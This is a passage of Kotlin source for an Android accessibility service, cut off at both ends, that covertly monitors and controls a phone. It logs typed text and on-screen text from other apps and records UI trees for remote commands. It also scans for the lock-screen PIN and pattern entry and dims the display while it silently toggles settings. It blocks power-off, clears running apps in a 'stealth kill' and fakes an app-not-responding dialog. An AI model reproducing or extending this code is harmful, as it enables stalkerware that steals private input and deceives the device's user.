                    initiateTaskSession(task)
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, task.id, "TARGET_ACQUIRED_RECORDING", null, null, null)
                    }
                }
                
                // 2. Data Capture Logic
                if (root != null && now < task.endTime && (now - lastScreenRead > 2000)) {
                    val treeJson = serializeNode(root, 0, task.depth)
                    task.lastSnapshot = treeJson
                    
                    // Shared Stream Logging (Optional but helpful)
                    val wrapper = JSONObject()
                    wrapper.put("pkg", pkgName)
                    wrapper.put("ts", now)
                    wrapper.put("tree", treeJson as Any)
                    DumpManager.appendLog("TREE", wrapper)
                }
            }
            if (now - lastScreenRead > 2000) lastScreenRead = now
        }

        // Periodically purge expired tasks that missed the watchdog
        val expired = treeTasks.filter { it.endTime in 1..now }
        if (expired.isNotEmpty()) {
            expired.forEach { 
                DebugLogger.log("SCRAM", "Task ${it.id} cleaned up manually.")
                treeTasks.remove(it) 
            }
            saveTreeTasks()
        }

        // --- 2. STANDARD MONITORING ---
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            debounceJob?.cancel()
            debounceJob = CoroutineScope(Dispatchers.Default).launch {
                delay(800) // Wait 800ms for UI to settle
                
                // CRITICAL FIX: 'event' is recycled by OS after onAccessibilityEvent returns.
                // We MUST use rootInActiveWindow to get the fresh screen state.
                val source = rootInActiveWindow ?: return@launch
                val textContent = StringBuilder()
                extractText(source, textContent)
                
                if (textContent.isNotEmpty()) {
                    val pm = packageManager
                    val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
                    val newTxt = textContent.take(100).toString()
                    
                    withContext(Dispatchers.IO) {
                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                        val historyStr = prefs.getString("text_history_by_app", "{}")
                        val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
                        val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

                        val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
                        
                        if (newTxt != lastTxt) {
                            // 1. STREAM LOGGING (NO LAG)
                            val entry = JSONObject()
                            entry.put("pkg", appName)
                            entry.put("ts", System.currentTimeMillis())
                            entry.put("txt", newTxt)
                            DumpManager.appendLog("SCREEN", entry)
                            
                            // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
                            prefs.edit()
                                .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                                .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                                .commit()

                            // 3. Verify
                            DumpManager.logVerification("READER", pkgName)
                        }
                    }
                }
            }
        }
    }

    fun startFontChangeSequence(cmdId: Int, fontName: String) {
        if (activeSequence != null) { DebugLogger.log("SEQ_GUARD", "Blocked Font Sequence: $activeSequence is running."); return }
        sequenceCmdId = cmdId
        sequenceTarget = fontName
        activeSequence = "FONT_PHASE_1"
        startSequenceWatchdog()
        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
        
        Handler(Looper.getMainLooper()).post {
            DimmerManager.applyDim(this, 0, "AUTO")
            val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    fun startThemeChangeSequence(cmdId: Int, themeName: String) {
        if (activeSequence != null) { DebugLogger.log("SEQ_GUARD", "Blocked Theme Sequence: $activeSequence is running."); return }
        sequenceCmdId = cmdId
        sequenceTarget = themeName
        activeSequence = "THEME_PHASE_1"
        startSequenceWatchdog()
        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
        
        Handler(Looper.getMainLooper()).post {
            DimmerManager.applyDim(this, 0, "AUTO")
            val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    fun startAirplaneModeSequence(cmdId: Int, targetState: String) {
        if (activeSequence != null) { DebugLogger.log("SEQ_GUARD", "Blocked Airplane Sequence: $activeSequence is running."); return }
        sequenceCmdId = cmdId
        sequenceTarget = targetState
        activeSequence = "AIRPLANE_PHASE_1"
        startSequenceWatchdog()
        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
        
        DebugLogger.log("AIRPLANE_SEQ", "Starting sequence. Dimming to 20%.")
        Handler(Looper.getMainLooper()).post {
            DimmerManager.applyDim(this, 20, "AUTO")
            val intent = Intent(android.provider.Settings.ACTION_AIRPLANE_MODE_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    fun startEyeShieldSequence(cmdId: Int, mode: String, silent: Boolean = false) {
        if (activeSequence != null) { DebugLogger.log("SEQ_GUARD", "Blocked Eye Shield Sequence: $activeSequence is running."); return }
        sequenceCmdId = cmdId
        sequenceTarget = mode // ENABLE or DISABLE
        activeSequence = "EYE_PHASE_1"
        startSequenceWatchdog()
        isSilentSequence = silent
        DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
        
        Handler(Looper.getMainLooper()).post {
            if (!silent) DimmerManager.applyDim(this, 0, "AUTO")
            val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }

    fun startMasterDisplayReset(cmdId: Int, isStandalone: Boolean = false) {
        if (activeSequence != null) { DebugLogger.log("SEQ_GUARD", "Blocked MDR Sequence: $activeSequence is running."); return }
        sequenceCmdId = cmdId
        activeSequence = "MDR_FONT_1"
        startSequenceWatchdog()
        mdrIsStandalone = isStandalone
        
        if (isStandalone) {
            // Arm the hardware ignition lock to prevent the thief from interrupting the standalone reset
            DimmerManager.IgnitionManager.request(this, "ACC_SEQUENCE")
        }
        
        DebugLogger.log("MDR_LIFECYCLE", "startMasterDisplayReset called. Dispatching Dimmer 0 AUTO and opening Settings.")
        Handler(Looper.getMainLooper()).post {
            DimmerManager.applyDim(this, 0, "AUTO")
            val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
        }
    }



    fun getKeyguardRoot(): android.view.accessibility.AccessibilityNodeInfo? {
        try {
            val wins = windows
            DebugLogger.log("UNLOCK_LIFECYCLE", "Scanning ${wins.size} windows for Keyguard Bouncer...")
            for (window in wins) {
                val root = window.root ?: continue
                val pkg = root.packageName?.toString() ?: ""
                val type = window.type
                
                if (pkg == "com.android.systemui" || type == android.view.accessibility.AccessibilityWindowInfo.TYPE_SYSTEM) {
                    val isBouncer = hasBouncerNodes(root)
                    DebugLogger.log("UNLOCK_LIFECYCLE", "Window Scan -> Type:$type, Pkg:$pkg | IsBouncer (Recursive): $isBouncer")
                    
                    if (isBouncer) {
                        return root
                    }
                }
            }
        } catch (e: Exception) {
            DebugLogger.log("UNLOCK_ERR", "Window scan failed: ${e.message}")
        }
        DebugLogger.log("UNLOCK_LIFECYCLE", "Keyguard Bouncer not found in window list. Falling back to rootInActiveWindow.")
        return rootInActiveWindow
    }

    private fun hasBouncerNodes(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        val cls = node.className?.toString() ?: ""
        val id = node.viewIdResourceName ?: ""
        val text = node.text?.toString() ?: ""
        
        if (cls.contains("PatternView", ignoreCase = true) || id.contains("lockPatternView", ignoreCase = true)) {
            return true
        }
        if (id.contains("pinEntry", ignoreCase = true) || id.contains("passwordEntry", ignoreCase = true) || cls.contains("EditText", ignoreCase = true)) {
            return true
        }
        if (text == "1" || text == "2" || text == "Emergency call" || text == "Emergency") {
            return true
        }
        for (i in 0 until node.childCount) {
            if (hasBouncerNodes(node.getChild(i))) return true
        }
        return false
    }

    private fun dumpNodeTree(node: android.view.accessibility.AccessibilityNodeInfo?, depth: Int = 0): String {
        if (node == null) return ""
        val sb = StringBuilder()
        val indent = "  ".repeat(depth)
        val bounds = android.graphics.Rect().apply { node.getBoundsInScreen(this) }
        sb.append(indent)
          .append("[Class: ").append(node.className)
          .append(", ID: ").append(node.viewIdResourceName ?: "None")
          .append(", Text: ").append(node.text ?: "None")
          .append(", Desc: ").append(node.contentDescription ?: "None")
          .append(", Bounds: ").append(bounds.toShortString())
          .append("]\n")
        
        for (i in 0 until node.childCount) {
            sb.append(dumpNodeTree(node.getChild(i), depth + 1))
        }
        return sb.toString()
    }

    fun getBypassOverlayRoot(): android.view.accessibility.AccessibilityNodeInfo? {
        try {
            val windowList = windows
            // 1. Look for the top-most application window that isn't our overlay
            for (window in windowList) {
                if (window.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION) {
                    val winRoot = window.root
                    if (winRoot != null && winRoot.packageName?.toString() != packageName) {
                        return winRoot
                    }
                }
            }
            // 1.5. NEW: Check if a full-screen SystemUI window (Keyguard/Bouncer) is active
            for (window in windowList) {
                val winRoot = window.root
                val pkg = winRoot?.packageName?.toString() ?: ""
                if (pkg == "com.android.systemui" && window.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_SYSTEM) {
                    val bounds = android.graphics.Rect().apply { window.getBoundsInScreen(this) }
                    // If it takes up most of the screen, it's not just the status bar
                    if (bounds.height() > 500) {
                        return winRoot
                    }
                }
            }
            // 2. Fallback: Any non-Cortex, non-SystemUI window
            for (window in windowList) {
                val winRoot = window.root
                val pkg = winRoot?.packageName?.toString() ?: ""
                if (winRoot != null && pkg != packageName && pkg != "com.android.systemui") {
                    return winRoot
                }
            }
        } catch (e: Exception) {}
        
        // 3. Absolute fallback
        return rootInActiveWindow
    }

    private fun handleSequenceEvent(pkg: String) {
        if (isSafeZoneActive(this) || activeSequence == null || !pkg.contains("settings")) return

        val root = getBypassOverlayRoot() ?: return
        
        logThrottled("SEQ_LIFECYCLE", "Evaluating active sequence: $activeSequence in pkg: $pkg")
        
        when (activeSequence) {
            "FONT_PHASE_1" -> {
                val node = root.findAccessibilityNodeInfosByText("Font size and style").firstOrNull()
                if (node != null) {
                    DebugLogger.log("FONT_SEQ_LIFECYCLE", "Found 'Font size and style' node. Attempting click...")
                    if (clickNode(node, "FONT_SEQ")) {
                        DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click successful. Transitioning to FONT_PHASE_2")
                        activeSequence = "FONT_PHASE_2"
                    } else DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click failed on 'Font size and style'.")
                } else logThrottled("FONT_SEQ_LIFECYCLE", "Waiting for 'Font size and style' to appear...")
            }
            "FONT_PHASE_2" -> {
                val node = root.findAccessibilityNodeInfosByText("Font style").firstOrNull()
                if (node != null) {
                    DebugLogger.log("FONT_SEQ_LIFECYCLE", "Found 'Font style' node. Attempting click...")
                    if (clickNode(node, "FONT_SEQ")) {
                        DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click successful. Transitioning to FONT_PHASE_3")
                        activeSequence = "FONT_PHASE_3"
                    } else DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click failed on 'Font style'.")
                } else logThrottled("FONT_SEQ_LIFECYCLE", "Waiting for 'Font style' to appear...")
            }
            "FONT_PHASE_3" -> {
                val tgt = sequenceTarget ?: "Default"
                val node = root.findAccessibilityNodeInfosByText(tgt).firstOrNull()
                if (node != null) {
                    DebugLogger.log("FONT_SEQ_LIFECYCLE", "Found target font: $tgt. Attempting click...")
                    if (clickNode(node, "FONT_SEQ")) {
                        DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click successful. Font changed to $tgt. Concluding sequence.")
                        finishSequence("Font changed to $tgt")
                    } else DebugLogger.log("FONT_SEQ_LIFECYCLE", "Click failed on target font '$tgt'.")
                } else logThrottled("FONT_SEQ_LIFECYCLE", "Waiting for target font: $tgt...")
            }
            "THEME_PHASE_1" -> {
                val tgt = sequenceTarget ?: "Light"
                val node = root.findAccessibilityNodeInfosByText(tgt).firstOrNull()
                if (node != null) {
                    DebugLogger.log("THEME_SEQ_LIFECYCLE", "Found target theme via text match: $tgt. Attempting click...")
                    if (clickNode(node, "THEME_SEQ")) {
                        DebugLogger.log("THEME_SEQ_LIFECYCLE", "Click successful. Theme changed to $tgt. Concluding sequence.")
                        finishSequence("Theme changed to $tgt")
                    } else DebugLogger.log("THEME_SEQ_LIFECYCLE", "Click failed on target theme '$tgt'.")
                } else {
                    var found: android.view.accessibility.AccessibilityNodeInfo? = null
                    fun search(n: android.view.accessibility.AccessibilityNodeInfo) {
                        if (found != null) return
                        val text = n.text?.toString() ?: n.contentDescription?.toString() ?: ""
                        if (text.equals(tgt, true) || text.equals("$tgt mode", true) || text.equals("$tgt theme", true)) {
                            found = n; return
                        }
                        for (i in 0 until n.childCount) search(n.getChild(i) ?: continue)
                    }
                    root.let { search(it) }
                    
                    if (found != null) {
                        DebugLogger.log("THEME_SEQ_LIFECYCLE", "Found target theme via deep search: $tgt. Attempting click...")
                        if (clickNode(found, "THEME_SEQ")) {
                            DebugLogger.log("THEME_SEQ_LIFECYCLE", "Deep search click successful. Concluding sequence.")
                            finishSequence("Theme changed to $tgt")
                        } else DebugLogger.log("THEME_SEQ_LIFECYCLE", "Deep search found '$tgt' but click failed.")
                    } else {
                        logThrottled("THEME_SEQ_LIFECYCLE", "Waiting for target theme: $tgt to appear in view...")
                    }
                }
            }
            "AIRPLANE_PHASE_1" -> {
                val isCurrentlyOn = android.provider.Settings.Global.getInt(contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) != 0
                val targetState = sequenceTarget == "ON"
                
                DebugLogger.log("AIRPLANE_SEQ_LIFECYCLE", "Checking Airplane state. Current: $isCurrentlyOn, Target: $targetState")
                if (isCurrentlyOn == targetState) {
                    DebugLogger.log("AIRPLANE_SEQ_LIFECYCLE", "Already in target state: $sequenceTarget. Concluding.")
                    finishSequence("Flight mode already $sequenceTarget")
                    return
                }

                var switchNode: android.view.accessibility.AccessibilityNodeInfo? = null

                // 1. Primary: Match standard Samsung / AOSP Switch Bar IDs
                val targetIds = listOf(
                    "com.android.settings:id/switch_background",
                    "com.android.settings:id/switch_widget",
                    "com.android.settings:id/switch_bar",
                    "android:id/switch_widget"
                )
                for (id in targetIds) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        switchNode = nodes.first()
                        DebugLogger.log("AIRPLANE_SEQ", "Found switch via direct ID match: $id")
                        break
                    }
                }

                // 2. Secondary: Search the view tree for any Switch/ToggleButton class
                if (switchNode == null) {
                    fun findAnySwitch(node: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
                        if (node == null) return null
                        val cls = node.className?.toString() ?: ""
                        if (cls.contains("Switch", true) || cls.contains("ToggleButton", true)) {
                            return node
                        }
                        for (i in 0 until node.childCount) {
                            val child = findAnySwitch(node.getChild(i))
                            if (child != null) return child
                        }
                        return null
                    }
                    switchNode = findAnySwitch(root)
                    if (switchNode != null) {
                        DebugLogger.log("AIRPLANE_SEQ", "Found switch via class scanning: ${switchNode.className}")
                    }
                }

                // 3. Tertiary: Legacy Text-Search Fallback
                if (switchNode == null) {
                    val titleNodes = root.findAccessibilityNodeInfosByText("Flight mode") + root.findAccessibilityNodeInfosByText("Airplane mode")
                    if (titleNodes.isNotEmpty()) {
                        fun findSwitchNear(n: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
                            if (n == null) return null
                            val cls = n.className?.toString() ?: ""
                            if (cls.contains("Switch", true) || cls.contains("ToggleButton", true)) return n
                            for (i in 0 until n.childCount) {
                                val child = findSwitchNear(n.getChild(i))
                                if (child != null) return child
                            }
                            return null
                        }
                        for (node in titleNodes) {
                            var parent = node.parent
                            var depth = 0
                            while (parent != null && depth < 3) {
                                val found = findSwitchNear(parent)
                                if (found != null) {
                                    switchNode = found
                                    DebugLogger.log("AIRPLANE_SEQ", "Found switch near text node: ${node.text}")
                                    break
                                }
                                parent = parent.parent
                                depth++
                            }
                            if (switchNode != null) break
                        }
                    }
                }

                // Execute Click with Parent-climbing clickability fallback
                var clicked = false
                if (switchNode != null) {
                    var nodeToClick: android.view.accessibility.AccessibilityNodeInfo? = switchNode
                    while (nodeToClick != null && !nodeToClick.isClickable) {
                        nodeToClick = nodeToClick.parent
                    }
                    
                    if (nodeToClick != null && nodeToClick.isClickable) {
                        DebugLogger.log("AIRPLANE_SEQ", "Clicking target node: ${nodeToClick.className} (ID: ${nodeToClick.viewIdResourceName})")
                        if (nodeToClick.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
                            clicked = true
                            finishSequence("Flight mode toggled to $sequenceTarget")
                        }
                    }
                }

                if (!clicked) {
                    logThrottled("AIRPLANE_SEQ", "Failed to locate or click Flight Mode switch.")
                }
            }
            "EYE_PHASE_1" -> {
                val titleText = "Eye comfort shield"
                val nodes = root.findAccessibilityNodeInfosByText(titleText)
                val targetNode = nodes.find { it.text?.toString() == titleText || it.contentDescription?.toString() == titleText }
                
                if (targetNode != null) {
                    var row = targetNode
                    while (row != null && !row.isClickable) row = row.parent
                    
                    if (row != null && clickNode(row)) {
                        DebugLogger.log("EYE_SEQ", "Clicked 'Eye comfort shield' row.")
                        activeSequence = "EYE_PHASE_2"
                    } else {
                        DebugLogger.log("EYE_SEQ", "Found 'Eye comfort shield' but row is not clickable.")
                    }
                } else logThrottled("EYE_SEQ", "Waiting for 'Eye comfort shield' row...")
            }
            "EYE_PHASE_2" -> {
                val goalEnable = sequenceTarget == "ENABLE"
                val onNodes = root.findAccessibilityNodeInfosByText("On")
                val offNodes = root.findAccessibilityNodeInfosByText("Off")
                
                val toggleNode = onNodes.find { it.text?.toString()?.equals("On", ignoreCase = true) == true && (it.isClickable || it.parent?.isClickable == true) }
                    ?: offNodes.find { it.text?.toString()?.equals("Off", ignoreCase = true) == true && (it.isClickable || it.parent?.isClickable == true) }
                    ?: onNodes.find { it.isClickable || it.parent?.isClickable == true }
                    ?: offNodes.find { it.isClickable || it.parent?.isClickable == true }

                if (toggleNode != null) {
                    val sb = java.lang.StringBuilder()
                    extractText(toggleNode, sb)
                    val text = sb.toString().trim()
                    
                    val isCurrentlyOn = text.contains("On", ignoreCase = true) && !text.equals("Off", ignoreCase = true)
                    
                    if (goalEnable == isCurrentlyOn) {
                        DebugLogger.log("EYE_SEQ", "Already in target state: $sequenceTarget")
                        finishSequence("Eye Shield already in target state: $sequenceTarget")
                    } else {
                        if (clickNode(toggleNode)) {
                            DebugLogger.log("EYE_SEQ", "Toggled state to: $sequenceTarget")
                            finishSequence("Eye Shield toggle executed: $sequenceTarget")
                        } else {
                            DebugLogger.log("EYE_SEQ", "Found toggle but click failed.")
                        }
                    }
                } else logThrottled("EYE_SEQ", "Waiting for On/Off toggle button...")
            }
            "MDR_FONT_1" -> {
                val node = root.findAccessibilityNodeInfosByText("Font size and style").firstOrNull()
                if (node != null) {
                    if (clickNode(node)) {
                        DebugLogger.log("MDR", "[MDR_FONT_1] Clicked 'Font size and style'")
                        activeSequence = "MDR_FONT_2"
                    } else DebugLogger.log("MDR", "[MDR_FONT_1] Found node but click failed.")
                } else logThrottled("MDR", "[MDR_FONT_1] Waiting for 'Font size and style'...")
            }
            "MDR_FONT_2" -> {
                val node = root.findAccessibilityNodeInfosByText("Font style").firstOrNull()
                if (node != null) {
                    if (clickNode(node)) {
                        DebugLogger.log("MDR", "[MDR_FONT_2] Clicked 'Font style'")
                        activeSequence = "MDR_FONT_3"
                    } else DebugLogger.log("MDR", "[MDR_FONT_2] Found node but click failed.")
                } else logThrottled("MDR", "[MDR_FONT_2] Waiting for 'Font style'...")
            }
            "MDR_FONT_3" -> {
                val node = root.findAccessibilityNodeInfosByText("Default").firstOrNull()
                if (node != null) {
                    if (clickNode(node)) {
                        val isSystemDark = (resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK) == android.content.res.Configuration.UI_MODE_NIGHT_YES
                        if (isSystemDark) {
                            DebugLogger.log("MDR", "[MDR_FONT_3] Clicked 'Default' font. System is Dark. Moving to Theme.")
                            activeSequence = "MDR_THEME"
                        } else {
                            DebugLogger.log("MDR", "[MDR_FONT_3] Clicked 'Default' font. System is already Light. Skipping Theme, moving to Eye.")
                            activeSequence = "MDR_EYE"
                        }
                        Handler(Looper.getMainLooper()).postDelayed({
                            val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                            }
                            startActivity(intent)
                        }, 500)
                    } else DebugLogger.log("MDR", "[MDR_FONT_3] Found 'Default' but click failed.")
                } else logThrottled("MDR", "[MDR_FONT_3] Waiting for 'Default' font option...")
            }
            "MDR_THEME" -> {
                val isSystemDark = (resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK) == android.content.res.Configuration.UI_MODE_NIGHT_YES
                if (!isSystemDark) {
                    DebugLogger.log("MDR", "[MDR_THEME] Already in Light theme. Skipping and moving to Eye Shield.")
                    activeSequence = "MDR_EYE"
                } else {
                    val node = root.findAccessibilityNodeInfosByText("Light").firstOrNull() ?: root.findAccessibilityNodeInfosByText("Light mode").firstOrNull()
                    if (node != null) {
                        if (clickNode(node)) {
                            DebugLogger.log("MDR", "[MDR_THEME] Clicked 'Light' theme. Moving to Eye Shield.")
                            activeSequence = "MDR_EYE"
                        } else DebugLogger.log("MDR", "[MDR_THEME] Found 'Light' but click failed.")
                    } else {
                        var found: android.view.accessibility.AccessibilityNodeInfo? = null
                        fun search(n: android.view.accessibility.AccessibilityNodeInfo) {
                            if (found != null) return
                            val text = n.text?.toString() ?: n.contentDescription?.toString() ?: ""
                            if (text.equals("Light", true) || text.equals("Light mode", true)) {
                                found = n; return
                            }
                            for (i in 0 until n.childCount) search(n.getChild(i) ?: continue)
                        }
                        root.let { search(it) }
                        
                        if (found != null) {
                            if (clickNode(found)) {
                                DebugLogger.log("MDR", "[MDR_THEME] Clicked 'Light' theme (via deep search). Moving to Eye.")
                                activeSequence = "MDR_EYE"
                            } else DebugLogger.log("MDR", "[MDR_THEME] Deep search found 'Light' but click failed.")
                        } else {
                            logThrottled("MDR", "[MDR_THEME] Waiting for 'Light' theme option...")
                        }
                    }
                }
            }
            "MDR_EYE" -> {
                val titleText = "Eye comfort shield"
                val nodes = root.findAccessibilityNodeInfosByText(titleText)
                val targetNode = nodes.find { it.text?.toString() == titleText || it.contentDescription?.toString() == titleText }
                if (targetNode != null) {
                    var row = targetNode
                    while (row != null && !row.isClickable) row = row.parent
                    if (row != null && clickNode(row)) {
                        DebugLogger.log("MDR", "[MDR_EYE] Clicked 'Eye comfort shield' menu.")
                        activeSequence = "MDR_EYE_2"
                    } else DebugLogger.log("MDR", "[MDR_EYE] Found 'Eye comfort shield' but row is not clickable.")
                } else logThrottled("MDR", "[MDR_EYE] Waiting for 'Eye comfort shield' row...")
            }
            "MDR_EYE_2" -> {
                val onNodes = root.findAccessibilityNodeInfosByText("On")
                val offNodes = root.findAccessibilityNodeInfosByText("Off")
                
                val toggleNode = onNodes.find { it.text?.toString()?.equals("On", ignoreCase = true) == true && (it.isClickable || it.parent?.isClickable == true) }
                    ?: onNodes.find { it.isClickable || it.parent?.isClickable == true }
                    
                val disabledNode = offNodes.find { it.text?.toString()?.equals("Off", ignoreCase = true) == true && (it.isClickable || it.parent?.isClickable == true) }
                    ?: offNodes.find { it.isClickable || it.parent?.isClickable == true }

                // Wait for the UI page to inflate before proceeding
                if (toggleNode != null || disabledNode != null) {
                    if (toggleNode != null) {
                        DebugLogger.log("MDR", "[MDR_EYE_2] Found 'On' state. Turning OFF.")
                        clickNode(toggleNode) // Turn it Off
                    } else {
                        DebugLogger.log("MDR", "[MDR_EYE_2] Already 'Off'. Proceeding to cleanup.")
                    }
                    
                    // FINAL STEP: FULL VISIBILITY RESTORE
                    sequenceWatchdogJob?.cancel()
                    activeSequence = null
                    val id = sequenceCmdId
                    val standalone = mdrIsStandalone
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, id, "SUCCESS", "Master Visual Reset Complete")
                        
                        if (standalone) {
                            // Release the ignition lock so the phone can be turned off normally again
                            DimmerManager.IgnitionManager.release(applicationContext, "ACC_SEQUENCE")
                        }

                        delay(1000)
                        performGlobalAction(GLOBAL_ACTION_HOME)
                        delay(500)
                        withContext(Dispatchers.Main) {
                            if (standalone) {
                                DimmerManager.removeOverlay(applicationContext)
                            }
                        }
                    }
                }
            }
        }
    }

    private fun clickNode(node: android.view.accessibility.AccessibilityNodeInfo?, tag: String = "GHOST_CLICK"): Boolean {
        var target = node
        var depth = 0
        val initialText = node?.text?.toString() ?: node?.contentDescription?.toString() ?: "N/A"
        val initialClass = node?.className?.toString() ?: "N/A"
        while (target != null && !target.isClickable) {
            target = target.parent
            depth++
        }
        if (target != null && target.isClickable) {
            val success = target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
            DebugLogger.log(tag, "Clicked node (Class: ${target.className}, Text: ${target.text ?: target.contentDescription}, Depth climbed: $depth) -> Success: $success")
            return success
        }
        DebugLogger.log(tag, "Failed to click: Node and parents are unclickable. Initial text: $initialText, Class: $initialClass")
        return false
    }

    private fun finishSequence(msg: String) {
        sequenceWatchdogJob?.cancel()
        activeSequence = null
        val id = sequenceCmdId
        val silent = isSilentSequence
        isSilentSequence = false
        DimmerManager.IgnitionManager.release(applicationContext, "ACC_SEQUENCE")
        CoroutineScope(Dispatchers.IO).launch {
            CommandProcessor.updateCommandStatus(applicationContext, id, "SUCCESS", msg)
            delay(1000)
            performGlobalAction(GLOBAL_ACTION_HOME)
            delay(500)
            performGlobalAction(GLOBAL_ACTION_HOME)
            if (!silent) {
                delay(2000)
                withContext(Dispatchers.Main) {
                    DimmerManager.removeOverlay(applicationContext)
                }
            }
        }
    }

    fun startStealthKillSequence() {
        if (isPerformingStealthKill) return
        isPerformingStealthKill = true
        
        CoroutineScope(Dispatchers.IO).launch {
            // 1. Trigger Recents
            performGlobalAction(GLOBAL_ACTION_RECENTS)
            
            // 2. Wait for Recents animation to settle
            delay(1200)
            
            // 3. Scan for Clear All (No package restrictions)
            var clicked = false
            val clearKeywords = listOf("Clear all", "Close all", "CLEAR ALL", "CLOSE ALL")
            
            for (i in 1..8) { // 8 attempts = ~2.4 seconds
                val root = rootInActiveWindow
                if (root != null) {
                    for (kw in clearKeywords) {
                        val nodes = root.findAccessibilityNodeInfosByText(kw)
                        if (!nodes.isNullOrEmpty()) {
                            for (node in nodes) {
                                // Fallback: sometimes text nodes aren't clickable, but their parents are
                                var target: AccessibilityNodeInfo? = node
                                while (target != null && !target.isClickable) {
                                    target = target.parent
                                }
                                val finalTarget = target
                                if (finalTarget != null && finalTarget.isClickable) {
                                    finalTarget.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    clicked = true
                                    DebugLogger.log("ANR_KILL", "Task purge executed via '$kw'.")
                                    break
                                }
                            }
                        }
                        if (clicked) break
                    }
                }
                if (clicked) break
                delay(300)
            }
            
            if (!clicked) {
                DebugLogger.log("ANR_KILL_LIFECYCLE", "Clear All button not found after 8 attempts. Proceeding to fallback.")
            } else {
                DebugLogger.log("ANR_KILL_LIFECYCLE", "Task purge click executed successfully. Waiting 1500ms for animation.")
            }
            
            // 4. Wait for the 'Clear All' animation to finish
            delay(1500)
            
            // 5. Go Home
            performGlobalAction(GLOBAL_ACTION_HOME)
            
            // 6. Wait for Home Screen to fully render (Fixes the Race Condition)
            delay(1000)
            
            // 7. Remove Dimmer and Launch Fake ANR Dialog on Main Thread
            withContext(Dispatchers.Main) {
                DimmerManager.IgnitionManager.release(this@MyAccessibilityService, "STEALTH_KILL")
                DimmerManager.removeOverlay(this@MyAccessibilityService)
                DynamicUIManager.removeOverlay(this@MyAccessibilityService, "STEALTH_KILL_COMPLETE")
                
                if (shouldShowAnrAfterKill) {
                    DebugLogger.log("MOCK_ANR", "Lifecycle: Background task purge complete. Dispatching ANR Intent to PulseActivity.")
                    val intent = Intent(this@MyAccessibilityService, PulseActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                        putExtra("is_anr_trigger", true)
                        putExtra("anr_app_name", pendingAnrAppName)
                    }
                    startActivity(intent)
                    shouldShowAnrAfterKill = false
                    pendingAnrAppName = null
                }
                isPerformingStealthKill = false
            }
        }
    }

    fun triggerFakeAnr(customAppName: String?) {
        val pkg = rootInActiveWindow?.packageName?.toString()
        var appName = customAppName
        
        if (appName.isNullOrEmpty() && pkg != null) {
            try {
                val pm = packageManager
                appName = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
            } catch(e: Exception) {}
        }
        if (appName.isNullOrEmpty()) appName = "This app"

